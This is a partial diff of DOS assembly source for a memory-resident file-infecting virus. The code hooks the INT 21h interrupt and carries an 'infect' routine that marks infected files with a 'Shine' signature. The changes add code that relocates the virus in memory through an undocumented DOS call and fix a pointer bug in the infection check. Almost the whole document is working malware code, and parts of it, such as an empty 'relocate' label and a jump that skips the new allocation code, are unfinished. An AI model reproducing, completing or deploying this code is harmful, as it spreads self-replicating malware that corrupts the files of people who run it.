@@ -21,10 +21,30 @@ get_delta:
      cmp ax, 8b7bh    ; Is AX 8b7b?
      je dont_install
 
-alloc_mem:            ; Ok guys, here comes the interesting and scary part. We gotta manually allocate memory, we cant use int 21h
-                      ; Cuz it aint working the way i want it to work
+     jmp install
+alloc_mem:            ; We are in fact not in memory, lets relocate us away from here
+     mov ax, 4800h    ; Function 48h Allocate Memory Blocks
+     mov bx, 20h      ; Allocate 32 paragraphs, 512 bytes
+     int 21h          ; Calling DOS
+     mov dx, ax       ; DX => AX
+     sub ax, 16       ; AX now points to the MCB
+     mov es, ax       ; AX => ES
+     push dx
+     
+     mov ax, 5500h    ; Create New PSP (Undocumented..... ooooo, spooky)
+     mov si, 15h      ; Top of Memory
+     int 21h          ; Call DOS
+     pop dx           ; DX = Segment address of PSP
+     push bp          ; Save BP
+     mov bp, 1        ; BP = 1, MCB offset 1 = PSP owner segment address
+     mov word [es:bp], dx ; Updating the PSP segment address to point to our own PSP
+     
+relocate:             ; Updated
+     
      
 
+;----------------
+; This is the INT 21H HANDLER that will replace int 21h     
 
 install:
      mov ax, 3521h    ; Get vector 21h
@@ -126,7 +146,8 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      add bp, data_section.shine_buf
      mov si, bp       ; Pointer to the "Shine" buffer
      pop bp
-     mov di, si+5
+     mov di, si
+     add di, 5
      mov cx, 5
      rep cmpsb       ; Is EOF = 'Shine'?
      je .abort_infection  ; Yes, abort infection
@@ -136,14 +157,6 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
 .abort_infection:
      ret
 
-old_alloc_mem:        ; We are in fact not in memory, lets relocate us away from here
-     mov ax, 4800h    ; Function 48h Allocate Memory Blocks
-     mov bx, 20h      ; Allocate 32 paragraphs, 512 bytes
-     int 21h          ; Calling DOS
-     mov dx, ax       ; DX => AX
-     mov ax, 5500h    ; Create New PSP (Undocumented..... ooooo, spooky)
-     mov si, 15h      ; Top of Memory
-     int 21h          ; Call DOS
 
 
 data_section:
